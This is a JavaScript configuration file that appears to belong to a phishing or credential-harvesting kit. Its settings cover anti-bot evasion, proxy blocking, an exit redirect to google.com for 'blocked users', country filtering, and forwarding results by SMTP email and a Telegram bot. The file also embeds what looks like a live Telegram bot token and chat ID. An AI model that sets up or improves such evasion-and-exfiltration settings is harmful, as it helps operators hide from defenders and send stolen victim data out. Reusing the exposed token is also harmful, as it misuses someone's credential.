module.exports = {
  // Anti-bot settings
  antibot: "yes", // yes|no
  block_proxy: "no", // yes|no
  
  // Email configuration
  email: {
    to: "your-email@example.com", // Put your email here
    smtp: {
      host: "smtp.gmail.com",
      port: 587,
      secure: false,
      auth: {
        user: "your-email@gmail.com",
        pass: "your-app-password" // Use app password for Gmail
      }
    }
  },
  
  // Telegram bot configuration
  telegram: {
    botToken: "8576907699:AAERUGDvOzciJqZuCZDcK-jkvwupAjSFIkw", // Put your telegram bot token here
    chatId: "953712851"    // Put your chat ID here
  },
  
  // Exit link for blocked users
  exitLink: "https://google.com",
  
  // Geographic filtering (comma-separated country codes)
  allowedCountries: "", // e.g., "US,CA,GB" - leave empty to allow all
  
  // Test mode
  testMode: false
};